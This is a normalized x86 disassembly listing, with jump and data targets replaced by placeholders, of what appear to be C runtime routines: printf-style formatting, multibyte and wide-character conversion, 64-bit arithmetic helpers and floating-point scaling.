lea ecx [ ebp - 0xb7 ]
push edx
push ebx
mov [ ebp - 0x18 ] ecx
push ecx
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
add eax 0xfffffffe
test edi 0x200
je r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4c4 ]
mov [ eax ] edx
jmp r-xdata
mov [ ebp - 0x9 ] bl
jmp r-xdata
or edi 0x8
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x30 ]
neg eax
mov [ ebp - 0x4 ] eax
or edi 0x2
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx ecx
lea ecx [ ecx + ecx * 4 ]
movsx edx bl
add ecx edx
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx ecx
lea ecx [ ecx + ecx * 4 ]
movsx edx bl
add ecx edx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
movsx edx bl
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ esi + 0x1 ] 0x32
jne r-xdata
add esi 0x2
or edi 0x100
and edi 0xfffffdef
mov eax 0x5
jmp r-xdata
test edi 0x200
je r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cl cl
mov edx [ eax - 0x4 ]
mov [ ebp - 0x2c ] edx
je r-xdata
lea eax [ ebp - 0xb7 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
test edi 0x1
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x18 ] rw-data
mov [ ebp - 0x18 ] rw-data
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax 0x6
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4c4 ]
mov [ edx ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov ax [ ebp - 0x4c4 ]
mov [ ecx ] ax
jmp r-xdata
mov eax 0x3
jmp r-xdata
cmp [ esi ] 0x38
jne r-xdata
cmp [ esi + 0x1 ] 0x36
jne r-xdata
add esi 0x2
or edi 0x10
and edi 0xfffffcff
mov eax 0x5
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cl cl
mov edx [ eax - 0x4 ]
mov [ ebp - 0x30 ] edx
je r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cl cl
mov dx [ eax - 0x4 ]
mov [ ebp - 0x32 ] dx
je r-xdata
mov eax [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp - 0x2c ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
or edi 0x4
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x2d
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
push edx
call sub_44f174
pop ecx
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
jne r-xdata
mov ecx [ ebp - 0x10 ]
add [ ebp - 0x40 ] ecx
test edi 0x2
jne r-xdata
cmp bl 0x6f
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push eax
mov edx [ ebp + 0x1c ]
push edx
call j_sub_4526d0
add esp 0x18
mov ecx edi
and ecx 0x100
push ecx
mov eax [ ebp + 0x1c ]
push eax
call j_sub_4526d0#2
add esp 0x8
mov [ ebp + 0x1c ] eax
inc esi
and edi 0xfffffcef
mov eax 0x5
jmp r-xdata
add esi 0x2
or edi 0x200
and edi 0xfffffeef
mov eax 0x5
jmp r-xdata
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x30 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
movzx eax [ ebp - 0x32 ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax [ ebp - 0x32 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
push edx
call sub_44f174
pop ecx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] eax
mov edx [ ebp - 0x18 ]
cmp [ edx ] 0x2d
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
dec [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
mov cl [ ebp - 0x9 ]
mov [ edx ] cl
mov eax [ ebp - 0x18 ]
push eax
call sub_44f174
pop ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x40 ]
jle r-xdata
dec [ ebp - 0x40 ]
test edi 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x40 ]
jle r-xdata
cmp bl 0x78
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jg r-xdata
mov eax 0x7fffffff
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax 0x7fffffff
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
dec [ ebp - 0x3c ]
jmp r-xdata
mov al [ ebp - 0x1d ]
push eax
push ecx
mov edx [ ebp - 0x38 ]
push edx
mov ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_452780
add esp 0x18
mov edx [ ebp - 0x18 ]
mov [ edx ] 0x0
jmp r-xdata
dec [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x520 ]
push eax
push 0x30
call sub_451160
add esp 0x8
lea edx [ ebp - 0x520 ]
push edx
push ebx
call sub_451160
add esp 0x8
lea edx [ ebp - 0x520 ]
push edx
push 0x20
call sub_451160
add esp 0x8
dec [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x40 ]
jg r-xdata
or edi 0x40
sub [ ebp - 0x4 ] 0x2
sub [ ebp - 0x10 ] 0x2
jns r-xdata
cmp bl 0x58
jne r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov [ ebp - 0x40 ] ecx
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov [ ebp - 0x40 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x3c ]
jle r-xdata
inc [ ebp - 0x40 ]
dec [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
mov al [ ebp - 0x9 ]
mov [ ecx ] al
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x40 ] ecx
mov eax [ ebp - 0x10 ]
sub [ ebp - 0x4 ] eax
mov edx [ ebp - 0x18 ]
cmp [ edx ] 0x2d
je r-xdata
xor edx edx
mov [ ebp - 0x10 ] edx
cmp [ edx ] 0x0
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x3c ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
xor edx edx
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x4c ] edx
mov ecx [ ebp - 0x40 ]
mov [ ebp - 0x54 ] ecx
jmp r-xdata
lea edx [ ebp - 0x520 ]
push edx
mov ecx [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
mov al [ ecx ]
push eax
call sub_451160
add esp 0x8
dec [ ebp - 0x40 ]
dec [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x20
je r-xdata
dec eax
inc [ ebp - 0x40 ]
inc edx
jmp r-xdata
dec eax
inc [ ebp - 0x40 ]
add edx 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
add [ ebp - 0x4 ] 0xffffffff
test eax eax
jg r-xdata
mov eax [ ebp - 0x40 ]
sub [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x54 ]
add [ ebp - 0x54 ] 0xffffffff
test eax eax
jg r-xdata
mov ecx [ ebp - 0x10 ]
add [ ebp - 0x10 ] 0xffffffff
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x2b
jne r-xdata
lea ecx [ ebp - 0x520 ]
push ecx
push 0x20
call sub_451160
add esp 0x8
jmp r-xdata
mov edx [ ebp - 0x40 ]
add [ ebp - 0x40 ] 0xffffffff
test edx edx
jne r-xdata
mov eax [ ebp - 0x44 ]
add [ ebp - 0x44 ] 0x2
mov dx [ eax ]
push edx
lea ecx [ ebp - 0x56 ]
push ecx
call sub_451f74
add esp 0x8
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jle r-xdata
lea edx [ ebp - 0x4b8 ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0x40 ] ecx
lea edx [ ebp - 0x520 ]
push edx
push 0x30
call sub_451160
add esp 0x8
lea edx [ ebp - 0x520 ]
push edx
mov ecx [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
mov al [ ecx ]
push eax
call sub_451160
add esp 0x8
jmp r-xdata
xor ecx ecx
mov eax [ ebp - 0x4c ]
lea edx [ ebp + eax - 0x4b8 ]
lea eax [ ebp - 0x56 ]
cmp ecx [ ebp - 0x50 ]
jge r-xdata
mov bl [ eax ]
inc eax
mov [ edx ] bl
inc edx
inc [ ebp - 0x4c ]
inc ecx
cmp ecx [ ebp - 0x50 ]
jl r-xdata
sub_451b00
push ebx
push esi
call sub_450fdc
xor esi esi
mov ebx rw-data
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
test [ ebx + 0x12 ] 0x3
je r-xdata
call sub_450fec
pop esi
pop ebx
retn
inc esi
add ebx 0x18
push ebx
call sub_450568
pop ecx
sub_451b34
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
cmp edx 0x10
jg r-xdata
sub edx 0x50
je r-xdata
je r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ ecx + 0xc ]
pop ebp
retn
dec edx
je r-xdata
mov edx [ eax + 0x18 ]
mov eax [ edx + 0x8 ]
pop ebp
retn
sub edx 0xe
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x10 ]
pop ebp
retn
jmp r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ ecx + 0x4 ]
pop ebp
retn
dec edx
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax + 0x18 ]
mov eax [ eax ]
pop ebp
retn
jmp r-xdata
sub_451d90
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp edx 0xff
jbe r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop ebp
retn
movsx edx dx
movzx eax [ edx * 2 + rw-data ]
and eax ecx
pop ebp
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x10 ]
movzx edx [ eax + edx * 2 + 0x2 ]
and ecx edx
mov eax ecx
pop ebp
retn
sub_451dd4
push ebp
mov ebp esp
push ecx
push ebx
cmp [ ebp + 0x8 ] 0xffff
mov ebx [ ebp + 0xc ]
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x2 ]
lea ecx [ ebp + 0x8 ]
push edx
push 0x1
push ecx
push 0x1
call GetStringTypeW
movzx eax [ ebp - 0x2 ]
and eax ebx
cmp [ ebp + 0x8 ] 0x100
jge r-xdata
pop ebx
pop ecx
pop ebp
retn
movsx ecx [ ebp + 0x8 ]
movzx eax [ ecx * 2 + rw-data ]
and eax ebx
jmp r-xdata
sub_451e2c
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
cmp [ eax ] 0x0
je r-xdata
test edx edx
jne r-xdata
xor ecx ecx
mov cl [ eax ]
test [ ecx + rw-data ] 0x4
je r-xdata
push 0x0
push 0x0
mov edx [ rw-data ]
push 0x1
push eax
push 0x9
mov ecx [ edx ]
push ecx
call MultiByteToWideChar
test eax eax
jne r-xdata
cmp edx 0x2
jl r-xdata
mov eax 0x1
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
push 0x0
push 0x0
mov edx [ rw-data ]
push 0x2
push eax
push 0x9
mov eax [ edx ]
push eax
call MultiByteToWideChar
test eax eax
jne r-xdata
mov eax 0x2
pop ebp
retn
sub_451ea8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
xor edx edx
mov dl [ ebx ]
test [ edx + rw-data ] 0x4
je r-xdata
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0x0
mov edx 0x1
test eax eax
jne r-xdata
cmp esi 0x2
jl r-xdata
mov eax 0x1
jmp r-xdata
xor ecx ecx
mov cl [ ebx ]
mov [ eax ] cx
push edx
push eax
mov ecx [ rw-data ]
push 0x1
push ebx
push 0x9
mov eax [ ecx ]
push eax
call MultiByteToWideChar
test eax eax
jne r-xdata
dec edx
cmp esi 0x2
jl r-xdata
mov ecx 0x1
test eax eax
jne r-xdata
mov eax 0x1
or eax 0xffffffff
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebx + 0x1 ] 0x0
jne r-xdata
push ecx
push eax
mov eax [ rw-data ]
push 0x2
push ebx
push 0x9
mov edx [ eax ]
push edx
call MultiByteToWideChar
test eax eax
jne r-xdata
dec ecx
mov eax 0x2
jmp r-xdata
sub_451f74
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
xor edx edx
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edx
push ecx
push 0x0
push 0x2
push eax
lea eax [ ebp + 0xc ]
mov edx [ rw-data ]
push 0x1
push eax
push 0x220
mov ecx [ edx ]
push ecx
call WideCharToMultiByte
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0xff
jbe r-xdata
or eax 0xffffffff
pop ecx
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ ebp + 0xc ]
mov [ eax ] dl
mov eax 0x1
pop ecx
pop ebp
retn
or eax 0xffffffff
pop ecx
pop ebp
retn
pop ecx
pop ebp
retn
sub_451fe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
test edi edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push 0x0
mov ecx [ rw-data ]
push 0xffffffff
push esi
push 0x9
mov eax [ ecx ]
push eax
call MultiByteToWideChar
mov ebx eax
test eax eax
jne r-xdata
push esi
call sub_44f174
pop ecx
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ rw-data ]
push edx
push edi
push 0xffffffff
push esi
push 0x9
mov eax [ ecx ]
push eax
call MultiByteToWideChar
mov ebx eax
test eax eax
je r-xdata
cmp ebx [ ebp + 0x10 ]
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
dec eax
or eax 0xffffffff
jmp r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
mov eax ebx
dec eax
jmp r-xdata
mov eax ebx
jmp r-xdata
xor ecx ecx
mov cl [ esi + ebx ]
mov [ edi ] cx
cmp [ esi + ebx ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax esi
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
inc ebx
add edi 0x2
cmp ebx [ ebp + 0x10 ]
jb r-xdata
mov eax ebx
jmp r-xdata
mov ecx edx
add edx 0xffffffff
test ecx ecx
je r-xdata
sub eax esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push eax
push edi
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
push edx
push esi
push 0x1
mov edx [ eax ]
push edx
call MultiByteToWideChar
mov ebx eax
test eax eax
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov cl [ eax ]
test [ ecx + rw-data ] 0x4
je r-xdata
inc eax
inc eax
sub_452114
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
lea edx [ ecx + 0x1 ]
mov eax ebx
jmp r-xdata
dec edx
je r-xdata
test edx edx
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax ecx
pop ebx
pop ebp
retn
cmp [ eax ] 0x0
jne r-xdata
add eax 0x2
sub eax ebx
sar eax 0x1
jns r-xdata
inc eax
pop ebx
pop ebp
retn
adc eax 0x0
sub_452150
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
push ebx
push esi
mov [ ebp - 0xc ] eax
xor ebx ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov ecx [ rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx [ ebp + 0xc ]
push edx
push 0x220
mov eax [ ecx ]
push eax
call WideCharToMultiByte
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_44f358
pop ecx
jmp r-xdata
lea edx [ ebp - 0xc ]
push edx
push 0x0
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
push eax
push 0xffffffff
mov edx [ ebp + 0xc ]
push edx
push 0x220
mov eax [ ecx ]
push eax
call WideCharToMultiByte
mov ebx eax
test ebx ebx
je r-xdata
cmp ebx [ ebp + 0x10 ]
jae r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ecx ] 0xff
jbe r-xdata
mov eax ebx
dec eax
or eax 0xffffffff
jmp r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
mov eax ebx
dec eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov cl [ edx ]
mov [ eax + ebx ] cl
mov edx [ ebp + 0xc ]
add [ ebp + 0xc ] 0x2
cmp [ edx ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx [ ebp + 0x10 ]
jae r-xdata
inc ebx
cmp ebx [ ebp + 0x10 ]
jb r-xdata
mov eax ebx
jmp r-xdata
mov eax ebx
jmp r-xdata
lea edx [ ebp - 0xc ]
lea ecx [ ebp - 0x6 ]
push edx
push 0x0
push 0x2
push ecx
push 0x1
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
push eax
push 0x0
mov ecx [ edx ]
push ecx
call WideCharToMultiByte
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
add edx ebx
cmp edx [ ebp + 0x10 ]
jbe r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
lea edx [ eax + ebx ]
lea eax [ ebp - 0x6 ]
cmp esi [ ebp - 0x4 ]
jge r-xdata
mov eax ebx
jmp r-xdata
add [ ebp + 0xc ] 0x2
cmp ebx [ ebp + 0x10 ]
jb r-xdata
mov cl [ eax ]
mov [ edx ] cl
test cl cl
jne r-xdata
inc eax
inc esi
inc edx
inc ebx
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax ebx
jmp r-xdata
sub_4522f4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_452317
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
xor edi 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_45238f
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
sub_4523d8
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_452452
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4524a0
cmp cl 0x20
jl r-xdata
shld edx eax cl
shl eax cl
retn
cmp cl 0x40
jl r-xdata
mov edx eax
shl edx cl
xor eax eax
retn
xor edx edx
xor eax eax
retn
sub_4524bc
cmp cl 0x20
jl r-xdata
shrd eax edx cl
sar edx cl
retn
cmp cl 0x40
jl r-xdata
mov eax edx
cdq
sar eax cl
retn
sar edx 0x1f
mov eax edx
retn
sub_4524d8
cmp cl 0x20
jl r-xdata
shrd eax edx cl
shr edx cl
retn
cmp cl 0x40
jl r-xdata
mov eax edx
xor edx edx
shr eax cl
retn
xor edx edx
xor eax eax
retn
sub_4524f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov edx [ ebp + 0x8 ]
cmp edx 0xffffecbc
jge r-xdata
cmp edx 0x1344
jle r-xdata
fld [ r-xdata ]
jmp r-xdata
test edx edx
jne r-xdata
fld [ rw-data ]
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
test edx edx
jge r-xdata
fld [ r-xdata ]
jmp r-xdata
mov ecx eax
and ecx 0x7
sar eax 0x3
test al 0x1
lea ecx [ ecx + ecx * 4 ]
mov ebx [ ecx * 2 + rw-data ]
mov [ ebp - 0xc ] ebx
mov ebx [ ecx * 2 + rw-data ]
mov [ ebp - 0x8 ] ebx
mov bx [ ecx * 2 + rw-data ]
mov [ ebp - 0x4 ] bx
je r-xdata
mov eax edx
neg eax
sar eax 0x1
test eax eax
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
test edx edx
jge r-xdata
test al 0x1
je r-xdata
fld [ ebp - 0xc ]
fld [ ebp - 0xc ]
fdivr [ r-xdata ]
jmp r-xdata
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sub_452688
push ebp
mov ebp esp
lea esp [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov ecx [ ebp + 0xc ]
and eax ecx
not ecx
fwait
movzx edx [ ebp - 0x4 ]
and edx ecx
or eax edx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_452718
push ebp
mov ebp esp
lea esp [ ebp - 0xa ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x7 ] 0x80
jne r-xdata
mov ecx [ eax ]
mov [ ebp - 0xa ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x6 ] ecx
mov [ ebp - 0x2 ] 0x403e
fld [ ebp - 0xa ]
mov esp ebp
pop ebp
retn
fild [ eax ]
mov esp ebp
pop ebp
retn
sub_452748
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp [ edx + 0x8 ] 0x403e
je r-xdata
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
fld [ edx ]
fistp [ eax ]
fwait
retn
sub_452780
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
cmp edi 0x2
jl r-xdata
mov [ esi ] 0x0
